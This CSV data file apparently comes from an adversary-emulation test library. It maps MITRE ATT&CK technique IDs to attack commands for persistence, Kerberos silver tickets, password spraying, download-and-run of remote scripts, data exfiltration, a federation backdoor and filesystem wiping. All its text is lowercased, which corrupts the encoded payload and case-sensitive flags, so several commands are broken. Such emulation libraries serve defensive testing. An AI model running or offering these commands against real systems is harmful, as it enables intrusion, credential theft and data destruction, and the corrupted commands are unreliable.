mitre_id,technique_name,command
T1547,HKLM - Add malicious StubPath value to existing Active Setup Entry,"set-itemproperty ""hklm:\software\microsoft\active setup\installed components\{c9e9a340-d1f1-11d0-821e-444553540600}"" ""stubpath"" ""#{payload}"" -force & $env:systemroot\system32\runonce.exe /alternateshellstartup"
T1547,HKLM - re-execute 'Internet Explorer Core Fonts' StubPath payload by decreasing version number,"set-itemproperty -path ""hkcu:\software\microsoft\active setup\installed components\{c9e9a340-d1f1-11d0-821e-444553540600}"" -name ""version"" -value ""0,0,0,0"" & $env:systemroot\system32\runonce.exe /alternateshellstartup"
T1222,chmod - Change file or folder mode (numeric mode),chmod #{numeric_mode} #{file_or_folder}
T1222,chmod - Change file or folder mode (symbolic mode),chmod #{symbolic_mode} #{file_or_folder}
T1222,chmod - Change file or folder mode (numeric mode) recursively,chmod -r #{numeric_mode} #{file_or_folder}
T1222,chmod - Change file or folder mode (symbolic mode) recursively,chmod -r #{symbolic_mode} #{file_or_folder}
T1222,chown - Change file or folder ownership and group,chown #{owner}:#{group} #{file_or_folder}
T1222,chown - Change file or folder ownership and group recursively,chown -r #{owner}:#{group} #{file_or_folder}
T1222,chown - Change file or folder mode ownership only,chown #{owner} #{file_or_folder}
T1222,chown - Change file or folder ownership recursively,chown -r #{owner} #{file_or_folder}
T1222,chattr - Remove immutable file attribute,chattr -i #{file_to_modify}
T1222,chflags - Remove immutable file attribute,touch #{file_to_modify} chflags simmutable #{file_to_modify} chflags nosimmutable #{file_to_modify}
T1222,Chmod through c script,#{compiled_file} /tmp/ t1222002
T1222,Chmod through c script (freebsd),#{compiled_file} /tmp/ t1222002
T1222,Chown through c script,sudo #{compiled_file} #{source_file}
T1222,Chown through c script (freebsd),#{compiled_file} #{source_file}
T1137,Code Executed Via Excel Add-in File (XLL),"$excelapp = new-object -comobject ""excel.application"" if(-not $excelapp.path.contains(""program files (x86)"")){ write-host ""64-bit office"" $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x64.xll"") } else{ write-host ""32-bit office"" $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x86.xll"") }"
T1137,Persistent Code Execution Via Excel Add-in File (XLL),"$excelapp = new-object -comobject ""excel.application"" if(-not $excelapp.path.contains(""program files (x86)"")){ write-host ""64-bit office"" copy ""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x64.xll"" ""$env:appdata\microsoft\addins\notepad.xll"" } else{ write-host ""32-bit office"" copy ""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x86.xll"" ""$env:appdata\microsoft\addins\notepad.xll"" } $ver = $excelapp.version $excelregpath=""hkcu:\software\microsoft\office\$ver\excel\options"" remove-item $excelregpath -erroraction ignore new-item -type directory $excelregpath | out-null new-itemproperty $excelregpath open -value ""/r notepad.xll"" -propertytype string | out-null $excelapp.quit() start-process ""excel"""
T1137,Persistent Code Execution Via Word Add-in File (WLL),"$wdapp = new-object -comobject ""word.application"" if(-not $wdapp.path.contains(""program files (x86)"")) { write-host ""64-bit office"" copy ""pathtoatomicsfolder\t1137.006\bin\addins\wordwll_x64.wll"" ""$env:appdata\microsoft\word\startup\notepad.wll"" } else{ write-host ""32-bit office"" copy ""pathtoatomicsfolder\t1137.006\bin\addins\wordwll_x86.wll"" ""$env:appdata\microsoft\word\startup\notepad.wll"" } stop-process -name ""winword"" start-process ""winword"""
T1137,Persistent Code Execution Via Excel VBA Add-in File (XLAM),"copy ""pathtoatomicsfolder\t1137.006\bin\addins\excelvbaaddin.xlam"" ""$env:appdata\microsoft\excel\xlstart\notepad.xlam"" start-process ""excel"""
T1137,Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM),"copy ""pathtoatomicsfolder\t1137.006\bin\addins\pptvbaaddin.ppam"" ""$env:appdata\microsoft\addins\notepad.ppam"" $ver = (new-object -comobject ""powerpoint.application"").version $excelregpath=""hkcu:\software\microsoft\office\$ver\powerpoint\addins\notepad"" new-item -type directory $excelregpath -force | out-null new-itemproperty $excelregpath ""autoload"" -value ""1"" -propertytype dword | out-null new-itemproperty $excelregpath ""path"" -value ""notepad.ppam"" -propertytype string | out-null stop-process -name ""powerpnt"" -erroraction ignore start-process ""powerpnt"""
T1564,Create a hidden file in a hidden directory,"mkdir /var/tmp/.hidden-directory echo ""t1564.001"" > /var/tmp/.hidden-directory/.hidden-file"
T1564,Mac Hidden file,"xattr -lr * / 2>&1 /dev/null | grep -c 2 ""00 00 00 00 00 00 00 00 40 00 ff ff ff ff 00 00"""
T1564,Create Windows System File with Attrib,attrib.exe +s #{file_to_modify}
T1564,Create Windows Hidden File with Attrib,attrib.exe +h #{file_to_modify}
T1564,Hidden files,setfile -a v #{filename}
T1564,Hide a Directory,touch /var/tmp/t1564.001_mac.txt chflags hidden /var/tmp/t1564.001_mac.txt
T1564,Show all hidden files,defaults write com.apple.finder appleshowallfiles yes
T1564,Hide Files Through Registry,reg add hklm\software\microsoft\windows\currentversion\explorer\advanced /v showsuperhidden /t reg_dword /d 0 /f reg add hklm\software\microsoft\windows\currentversion\explorer\advanced /v hidden /t reg_dword /d 0 /f
T1564,Create Windows Hidden File with powershell,$file = get-item $env:temp\t1564.001-9.txt -force $file.attributes='hidden'
T1564,Create Windows System File with powershell,$file = get-item $env:temp\t1564.001-10.txt -force $file.attributes='system'
T1546,Persistence with Custom AutodialDLL,set-itemproperty hklm:\system\currentcontrolset\services\winsock2\parameters -name autodialdll -value pathtoatomicsfolder\t1546\bin\altwinsock2dll.dll
T1546,HKLM - Persistence using CommandProcessor AutoRun key (With Elevation),"new-itemproperty -path ""hklm:\software\microsoft\command processor"" -name ""autorun"" -value ""#{command}"" -propertytype ""string"""
T1546,HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation),"$path = ""hkcu:\software\microsoft\command processor"" if (!(test-path -path $path)){ new-item -itemtype key -path $path } new-itemproperty -path $path -name ""autorun"" -value ""#{command}"" -propertytype ""string"""
T1546,WMI Invoke-CimMethod Start Process,"# set the remote computer name and credentials $remotecomputer = ""#{dest}"" $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword # create a cim session $cimsession = new-cimsession -computername $remotecomputer -credential $credential # define the process you want to start $processtostart = ""#{process}"" # invoke the create method on the win32_process class to start the process $result = invoke-cimmethod -cimsession $cimsession -classname win32_process -methodname create -arguments @{commandline = $processtostart} # check the result if ($result.returnvalue -eq 0) { write-host ""process started successfully with process id: $($result.processid)"" } else { write-host ""failed to start the process. error code: $($result.returnvalue)"" } # clean up the cim session remove-cimsession -cimsession $cimsession"
T1546,Adding custom debugger for Windows Error Reporting,"reg add ""hklm\software\microsoft\windows\windows error reporting\hangs"" /v debugger /t reg_sz /d ""c:\windows\system32\notepad.exe"" /f"
T1546,Load custom DLL on mstsc execution,"reg add ""hklm\software\microsoft\terminal server client"" /v clxdllpath /t reg_sz /d ""#{dll_inf}"" /f"
T1546,Persistence using automatic execution of custom DLL during RDP session,"reg add ""hklm\system\currentcontrolset\control\terminal server\addins\testdvcplugin"" /v path /t reg_sz /d ""c:\windows\system32\amsi.dll"" /f"
T1546,Persistence via ErrorHandler.cmd script execution,copy-item -path pathtoatomicsfolder\t1546\src\errorhandler.cmd -destination c:\windows\setup\scripts\errorhandler.cmd c:\windows\system32\oobe\setup
T1546,Persistence using STARTUP-PATH in MS-WORD,"reg add ""hkcu\software\microsoft\office\16.0\word\options"" /v startup-path /t reg_sz /d ""c:\users\%username%\appdata\roaming\microsoft\windows\recent"" /f"
T1055,Process injection ListPlanting,"start-process ""#{exe_binary}"" start-sleep -seconds 7 get-process -name notepad -erroraction silentlycontinue | stop-process -force"
T1057,Process Discovery - ps,ps >> #{output_file} ps aux >> #{output_file}
T1057,Process Discovery - tasklist,tasklist
T1057,Process Discovery - Get-Process,get-process
T1057,Process Discovery - get-wmiObject,get-wmiobject -class win32_process
T1057,Process Discovery - wmic process,wmic process get /format:list
T1057,Discover Specific Process - tasklist,tasklist | findstr #{process_to_enumerate}
T1057,Process Discovery - Process Hacker,"start-process -filepath ""$env:programfiles\process hacker 2\#{processhacker_exe}"""
T1057,Process Discovery - PC Hunter,"start-process -filepath ""c:\temp\externalpayloads\pchunter_free\#{pchunter64_exe}"""
T1057,Launch Taskmgr from cmd to View running processes,taskmgr.exe /7
T1555,Azure - Dump All Azure Key Vaults with Microburst,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azurepasswords.ps1"" $password = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $password connect-azurermaccount -credential $credential get-azurepasswords -subscription '#{subscription_id}' > #{output_file} cat #{output_file}"
T1078,Enable Guest account with RDP capability and admin privileges,"net user #{guest_user} /active:yes net user #{guest_user} #{guest_password} net localgroup #{local_admin_group} #{guest_user} /add net localgroup ""#{remote_desktop_users_group_name}"" #{guest_user} /add reg add ""hklm\system\currentcontrolset\control\terminal server"" /v fdenytsconnections /t reg_dword /d 0 /f reg add ""hklm\system\currentcontrolset\control\terminal server"" /v ""allowtsconnections"" /t reg_dword /d 0x1 /f"
T1078,Activate Guest Account,net user #{guest_user} /active:yes
T1078,Enable Guest Account on macOS,sudo sysadminctl -guestaccount on
T1129,ESXi - Install a custom VIB on an ESXi host,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}"""
T1137,Office Application Startup Test Persistence (HKCU),"$wdapp = new-object -comobject ""word.application"" if(-not $wdapp.path.contains(""program files (x86)"")) { write-host ""64-bit office"" reg add ""hkey_current_user\software\microsoft\office test\special\perf"" /t reg_sz /d ""pathtoatomicsfolder\t1137.002\bin\officetest_x64.dll"" /f } else{ write-host ""32-bit office"" reg add ""hkey_current_user\software\microsoft\office test\special\perf"" /t reg_sz /d ""pathtoatomicsfolder\t1137.002\bin\officetest_x86.dll"" /f } stop-process -name ""winword"" start-process ""winword"""
T1113,Screencapture,screencapture #{output_file}
T1113,Screencapture (silent),screencapture -x #{output_file}
T1113,X Windows Capture,xwd -root -out #{output_file} xwud -in #{output_file}
T1113,X Windows Capture (freebsd),xwd -root -out #{output_file} xwud -in #{output_file}
T1113,Capture Linux Desktop using Import Tool,import -window root #{output_file}
T1113,Capture Linux Desktop using Import Tool (freebsd),import -window root #{output_file}
T1113,Windows Screencapture,"cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12 add-type -memberdefinition '[dllimport(""user32.dll"")] public static extern void mouse_event(int flags, int dx, int dy, int cbuttons, int info);' -name u32 -namespace w; [w.u32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0); cmd /c ""timeout #{recording_time} > null && psr.exe /stop"""
T1113,Windows Screen Capture (CopyFromScreen),"add-type -assemblyname system.windows.forms $screen = [windows.forms.systeminformation]::virtualscreen $bitmap = new-object drawing.bitmap $screen.width, $screen.height $graphic = [drawing.graphics]::fromimage($bitmap) $graphic.copyfromscreen($screen.left, $screen.top, 0, 0, $bitmap.size) $bitmap.save(""#{output_file}"")"
T1113,Windows Recall Feature Enabled - DisableAIDataAnalysis Value Deleted,"reg add ""hkey_current_user\software\policies\microsoft\windows\windowsai"" /v disableaidataanalysis /t reg_dword /d 0 /f reg delete ""hkey_current_user\software\policies\microsoft\windows\windowsai"" /v disableaidataanalysis /f"
T1558,Crafting Active Directory silver tickets with mimikatz,"remove-item $env:temp\silver.bat -erroraction ignore remove-item $env:temp\silver.txt -erroraction ignore # get current domain sid if default was used $domain_sid = ""#{domain_sid}"" if ($domain_sid -match ""default"") { # code from https://www.sevecek.com/englishpages/lists/posts/post.aspx?id=60 $domain = gwmi win32_computersystem | select -expand domain $krbtgtsid = (new-object security.principal.ntaccount $domain\krbtgt).translate([security.principal.securityidentifier]).value $domain_sid = $krbtgtsid.substring(0, $krbtgtsid.lastindexof('-')) } # create batch file with commands to run in a separate ""runas /netonly"" session # so we don't purge kerberos ticket from the current windows session # its output goes to silver.txt temp file, because we cannot capture ""runas /netonly"" output otherwise @"" >%temp%\silver.txt 2>&1 ( echo purge existing tickets and create silver ticket: klist purge #{mimikatz_path} ""kerberos::golden /domain:#{domain} /sid:domain_sid /aes256:#{service_aes256_key} /user:#{account} /service:host /target:#{target}.#{domain} /ptt"" ""exit"" echo. echo executing:schtasks /query /s #{target}.#{domain} schtasks /query /s #{target}.#{domain} echo. echo tickets after requesting schtasks: klist echo. echo end of silver ticket attack ) ""@ -replace ""domain_sid"", $domain_sid | out-file -encoding oem $env:temp\silver.bat # run batch file in a new empty session (password and username do not matter) echo ""foo"" | runas /netonly /user:fake ""$env:temp\silver.bat"" | out-null # wait until the output file has logged the entire attack do { start-sleep 1 # wait a bit so the output file has time to be created get-content -path ""$env:temp\silver.txt"" -wait | foreach-object { if ($_ -match 'end of silver ticket attack') { break } } } while ($false) # dummy loop so that 'break' can be used # show output from new empty session get-content $env:temp\silver.txt # cleanup temp files remove-item $env:temp\silver.bat -erroraction ignore remove-item $env:temp\silver.txt -erroraction ignore"
T1556,Malicious PAM rule,"sudo sed -i ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}"
T1556,Malicious PAM rule (freebsd),"sudo sed -i """" ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}"
T1556,Malicious PAM module,"sudo sed -i ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}"
T1110,Password Spray all Domain Users,"@for /f %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\ipc$ /user:""%userdomain%\%n"" ""#{password}"" 1>nul 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\ipc$ > nul"
T1110,Password Spray (DomainPasswordSpray),[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/dafthack/domainpasswordspray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/domainpasswordspray.ps1' -usebasicparsing); invoke-domainpasswordspray -password spring2017 -domain #{domain} -force
T1110,Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos),"if (""#{auth}"".tolower() -notin @(""ntlm"",""kerberos"")) { write-host ""only 'ntlm' and 'kerberos' auth methods are supported"" exit 1 } $domainusers = get-aduser -ldapfilter '(&(samaccounttype=805306368)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))' -server #{domain} | select-object -expandproperty samaccountname [system.reflection.assembly]::loadwithpartialname(""system.directoryservices.protocols"") | out-null $di = new-object system.directoryservices.protocols.ldapdirectoryidentifier(""#{domain}"",389) $domainusers | foreach-object { $user = $_ $password = '#{password}' $credz = new-object system.net.networkcredential($user, $password, ""#{domain}"") $conn = new-object system.directoryservices.protocols.ldapconnection($di, $credz, [system.directoryservices.protocols.authtype]::#{auth}) try { write-host "" [-] attempting ${password} on account ${user}."" $conn.bind() # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success write-host "" [!] ${user}:${password} are valid credentials!"" } catch { write-host $_.exception.message } } write-host ""end of password spraying"""
T1110,Password spray all Azure AD users with a single password,"import-module -name azuread $pword = convertto-securestring -string ""#{valid_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{valid_username}"", $pword connect-azuread -credential $credential > $null ($users = get-azureaduser -all $true) > $null disconnect-azuread > $null $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $users | foreach-object { $user = $_.userprincipalname $credential = new-object -typename system.management.automation.pscredential -argumentlist ""$user"", $pword try { write-host "" [-] attempting #{password} on account ${user}."" connect-azuread -credential $credential 2>&1> $null # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success write-host "" [!] ${user}:#{password} are valid credentials!`r`n"" disconnect-azuread > $null } catch { write-host "" [-] ${user}:#{password} invalid credentials.`r`n"" } } write-host ""end of password spraying"""
T1110,WinPwn - DomainPasswordSpray Attacks,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') domainpassspray -consoleoutput -noninteractive -emptypasswords
T1110,Password Spray Invoke-DomainPasswordSpray Light,"function invoke-dpslight ($password, $userlist) { $users = get-content $userlist $domain = ""ldap://"" + ([adsi]"""").distinguishedname foreach ($user in $users) { $domain_check = new-object system.directoryservices.directoryentry($domain, $user, $password) if ($domain_check.name -ne $null) { write-host -foregroundcolor green ""password found for user:$user password:$password"" } else { write-host "". "" -nonewline} } write-host -foregroundcolor green ""finished"" } invoke-dpslight ""#{password}"" $env:temp\usersdpslight.txt"
T1110,Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365),"import-module ""pathtoatomicsfolder\..\externalpayloads\msolspray.ps1"" invoke-msolspray -userlist ""#{user_list}"" -password ""#{password}"""
T1110,Password Spray using Kerbrute Tool,"cd ""pathtoatomicsfolder\..\externalpayloads"" .\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} ""pathtoatomicsfolder\..\externalpayloads\passwordspray.txt"" password132"
T1110,AWS - Password Spray an AWS using GoAWSConsoleSpray,cd /tmp git clone git@github.com:whiteoaksecurity/goawsconsolespray.git cd /tmp/goawsconsolespray go run main.go goawsconsolespray -a #{aws_account_id} -u pathtoatomicsfolder/t1110.003/src/aws_users.txt -p pathtoatomicsfolder/t1110.003/src/aws_passwords.txt
T1574,User scope COR_PROFILER,"write-host ""creating registry keys in hkcu:software\classes\clsid\#{clsid_guid}"" -foregroundcolor cyan new-item -path ""hkcu:\software\classes\clsid\#{clsid_guid}\inprocserver32"" -value ""#{file_name}"" -force | out-null new-itemproperty -path hkcu:\environment -name ""cor_enable_profiling"" -propertytype string -value ""1"" -force | out-null new-itemproperty -path hkcu:\environment -name ""cor_profiler"" -propertytype string -value ""#{clsid_guid}"" -force | out-null new-itemproperty -path hkcu:\environment -name ""cor_profiler_path"" -propertytype string -value ""#{file_name}"" -force | out-null write-host ""executing eventvwr.msc"" -foregroundcolor cyan start mmc.exe eventvwr.msc"
T1574,System Scope COR_PROFILER,"write-host ""creating system environment variables"" -foregroundcolor cyan new-itemproperty -path 'hklm:\system\currentcontrolset\control\session manager\environment' -name ""cor_enable_profiling"" -propertytype string -value ""1"" -force | out-null new-itemproperty -path 'hklm:\system\currentcontrolset\control\session manager\environment' -name ""cor_profiler"" -propertytype string -value ""#{clsid_guid}"" -force | out-null new-itemproperty -path 'hklm:\system\currentcontrolset\control\session manager\environment' -name ""cor_profiler_path"" -propertytype string -value ""#{file_name}"" -force | out-null"
T1574,Registry-free process scope COR_PROFILER,"$env:cor_enable_profiling = 1 $env:cor_profiler = '#{clsid_guid}' $env:cor_profiler_path = '""#{file_name}""' powershell -c 'start-sleep 1'"
T1056,Hook PowerShell TLS Encrypt/Decrypt Messages,"mavinject $pid /injectrunning ""#{file_name}"" invoke-webrequest #{server_name} -usebasicparsing"
T1547,Persistence by modifying Windows Terminal profile,"mv #{settings_json_def} #{settings_json_tmp} invoke-webrequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/t1547.015/src/settings.json?raw=true"" -outfile ""#{settings_json_def}"" wt.exe"
T1547,Add macOS LoginItem using Applescript,osascript #{scriptfile}
T1546,Persistence via WMI Event Subscription - CommandLineEventConsumer,"$filterargs = @{name='atomicredteam-wmipersistence-commandlineeventconsumer-example'; eventnamespace='root\cimv2'; querylanguage=""wql""; query=""select * from __instancemodificationevent within 60 where targetinstance isa 'win32_perfformatteddata_perfos_system' and targetinstance.systemuptime >= 240 and targetinstance.systemuptime < 325""}; $filter=new-ciminstance -namespace root/subscription -classname __eventfilter -property $filterargs $consumerargs = @{name='atomicredteam-wmipersistence-commandlineeventconsumer-example'; commandlinetemplate=""$($env:systemroot)\system32\notepad.exe"";} $consumer=new-ciminstance -namespace root/subscription -classname commandlineeventconsumer -property $consumerargs $filtertoconsumerargs = @{ filter = [ref] $filter; consumer = [ref] $consumer; } $filtertoconsumerbinding = new-ciminstance -namespace root/subscription -classname __filtertoconsumerbinding -property $filtertoconsumerargs"
T1546,Persistence via WMI Event Subscription - ActiveScriptEventConsumer,"$filterargs = @{name='atomicredteam-wmipersistence-activescripteventconsumer-example'; eventnamespace='root\cimv2'; querylanguage=""wql""; query=""select * from __instancemodificationevent within 60 where targetinstance isa 'win32_perfformatteddata_perfos_system' and targetinstance.systemuptime >= 240 and targetinstance.systemuptime < 325""}; $filter=set-wmiinstance -class __eventfilter -namespace ""root\subscription"" -arguments $filterargs $consumerargs = @{name='atomicredteam-wmipersistence-activescripteventconsumer-example'; scriptingengine='vbscript'; scripttext=' set objws = createobject(""wscript.shell"") objws.run ""notepad.exe"", 0, true '} $consumer=set-wmiinstance -namespace ""root\subscription"" -class activescripteventconsumer -arguments $consumerargs $filtertoconsumerargs = @{ filter = $filter; consumer = $consumer; } $filtertoconsumerbinding = set-wmiinstance -namespace 'root/subscription' -class '__filtertoconsumerbinding' -arguments $filtertoconsumerargs"
T1546,Windows MOFComp.exe Load MOF File,"#{mofcomp_path} ""#{mof_file}"""
T1020,IcedID Botnet HTTP PUT,"$filename = ""#{file}"" $url = ""#{domain}"" $file = new-item -force $filename -value ""this is art icedid botnet exfil test"" $contenttype = ""application/octet-stream"" try {invoke-webrequest -uri $url -method put -contenttype $contenttype -infile $filename} catch{}"
T1020,Exfiltration via Encrypted FTP,"$sampledata = ""sample data for exfiltration test"" set-content -path ""#{samplefile}"" -value $sampledata $ftpurl = ""#{ftpserver}"" $creds = get-credential -credential ""#{credentials}"" invoke-webrequest -uri $ftpurl -method put -infile ""#{samplefile}"" -credential $creds"
T1552,Enumeration for Credentials in Registry,reg query hklm /f password /t reg_sz /s reg query hkcu /f password /t reg_sz /s
T1552,Enumeration for PuTTY Credentials in Registry,reg query hkcu\software\simontatham\putty\sessions /t reg_sz /s
T1059,AppleScript,"osascript -e ""do shell script \""echo \\\""import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aw1wb3j0ihn5cztpbxbvcnqgcmusihn1ynbyb2nlc3m7y21kid0ginbzic1lzib8igdyzxagtgl0dgxlxcbtbml0y2ggfcbncmvwic12igdyzxaicnbzid0gc3vichjvy2vzcy5qb3blbihjbwqsihnozwxspvrydwusihn0zg91dd1zdwjwcm9jzxnzllbjueupcm91dca9ihbzlnn0zg91dc5yzwfkkckkchmuc3rkb3v0lmnsb3nlkckkawygcmuuc2vhcmnokcjmaxr0bgugu25pdgnoiiwgb3v0ktokicagc3lzlmv4axqokqppbxbvcnqgdxjsbglimjskvue9j01vemlsbgevns4wichxaw5kb3dzie5uidyumtsgv09xnjq7ifryawrlbnqvny4woybydjoxms4wksbsawtliedly2tvjztzzxj2zxi9j2h0dha6ly8xmjcumc4wlje6odano3q9jy9sb2dpbi9wcm9jzxnzlnboccc7cmvxpxvybgxpyjiuumvxdwvzdchzzxj2zxirdck7cnjlcs5hzgrfagvhzgvykcdvc2vylufnzw50jyxvqsk7cnjlcs5hzgrfagvhzgvykcddb29rawunlcjzzxnzaw9upxqzvmhwt3mvrhldy0rurnpjs2fuunhrdmszst0iktskchjvehkgpsb1cmxsawiyllbyb3h5sgfuzgxlcigpowpvid0gdxjsbglimi5idwlszf9vcgvuzxiochjvehkpowp1cmxsawiylmluc3rhbgxfb3blbmvykg8powphpxvybgxpyjiudxjsb3blbihyzxesdgltzw91dd0zks5yzwfkkck7cg=='));\\\"" | python &\"""""
T1484,Add Federation to Azure AD,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""#{azure_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{azure_username}"", $pword try { connect-azuread -credential $credential -erroraction stop > $null } catch { write-host ""error: azuread could not connect"" exit 1 } try { $domain = get-azureaddomain -name ""#{domain_name}"" } catch { write-host ""error: domain """"#{domain_name}"""" not found"" exit 1 } if (-not $domain.isverified) { write-host ""error: domain """"#{domain_name}"""" not verified"" exit 1 } if ($domain.authenticationtype -eq ""federated"") { write-host ""error: domain """"#{domain_name}"""" already federated. try with a different domain or re-create it before."" exit 1 } $at = get-aadintaccesstokenforaadgraph -credentials $credential if (-not $at) { write-host ""error: aadinternals could not connect"" exit 1 } $new = convertto-aadintbackdoor -accesstoken $at -domainname ""#{domain_name}"" if ($new) { write-host ""federation successfully added to azure ad"" write-host $new } else { write-host ""the federation setup failed"" } write-host ""end of federation configuration."""
T1127,Lolbin Jsc.exe compile javascript to exe,"copy ""#{filename}"" %temp%\hello.js #{jscpath}\#{jscname} %temp%\hello.js"
T1127,Lolbin Jsc.exe compile javascript to dll,"copy ""#{filename}"" %temp%\libhello.js #{jscpath}\#{jscname} /t:library %temp%\libhello.js"
T1553,Mount ISO image,"mount-diskimage -imagepath ""#{path_of_iso}"""
T1553,Mount an ISO image and run executable from the ISO,"mount-diskimage -imagepath ""#{path_of_iso}"" -storagetype iso -access readonly $keep = get-volume -filesystemlabel ""testiso"" $driveletter = ($keep | get-volume).driveletter invoke-item ""$($driveletter):\hello.exe"""
T1553,Remove the Zone.Identifier alternate data stream,unblock-file -path #{file_path}
T1553,Execute LNK file from ISO,"mount-diskimage -imagepath ""#{path_of_iso}"" -storagetype iso -access readonly $keep = get-volume -filesystemlabel ""allthethings"" $driveletter = ($keep | get-volume).driveletter $instance = [activator]::createinstance([type]::gettypefromclsid(""{c08afd90-f2a1-11d1-8455-00a0c91f3880}"")) $instance.document.application.shellexecute($driveletter+"":\document.lnk"","""",$driveletter+"":\"",$null,0)"
T1070,Delete a single file - FreeBSD/Linux/macOS,rm -f #{file_to_delete}
T1070,Delete an entire folder - FreeBSD/Linux/macOS,rm -rf #{folder_to_delete}
T1070,Overwrite and delete a file with shred,shred -u #{file_to_shred}
T1070,Delete a single file - Windows cmd,del /f #{file_to_delete}
T1070,Delete an entire folder - Windows cmd,rmdir /s /q #{folder_to_delete}
T1070,Delete a single file - Windows PowerShell,remove-item -path #{file_to_delete}
T1070,Delete an entire folder - Windows PowerShell,remove-item -path #{folder_to_delete} -recurse
T1070,Delete Filesystem - Linux,"[ ""$(uname)"" = 'linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -r 0 / && rm -rf / > /dev/null 2> /dev/null"
T1070,Delete Prefetch File,"remove-item -path (join-path ""$env:systemroot\prefetch\"" (get-childitem -path ""$env:systemroot\prefetch\*.pf"" -name)[0])"
T1070,Delete TeamViewer Log Files,new-item -path #{teamviewer_log_file} -force | out-null remove-item #{teamviewer_log_file} -force -erroraction ignore
T1070,Clears Recycle bin via rd,rd /s /q %systemdrive%\$recycle.bin
T1553,Gatekeeper Bypass,xattr -d com.apple.quarantine #{app_path}
T1485,Windows - Overwrite file with SysInternals SDelete,"if (-not (test-path ""#{file_to_delete}"")) { new-item ""#{file_to_delete}"" -force } & ""#{sdelete_exe}"" -accepteula ""#{file_to_delete}"""
T1485,FreeBSD/macOS/Linux - Overwrite file with DD,dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l #{file_to_overwrite} | awk '{print $5}') iflag=count_bytes
T1485,Overwrite deleted data on C drive,cipher.exe /w:c:
T1485,GCP - Delete Bucket,gcloud config set project #{project_id} gcloud storage buckets delete gs://#{bucket_name}
T1485,ESXi - Delete VM Snapshots,"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""for i in `vim-cmd vmsvc/getallvms | awk 'nr>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done"""
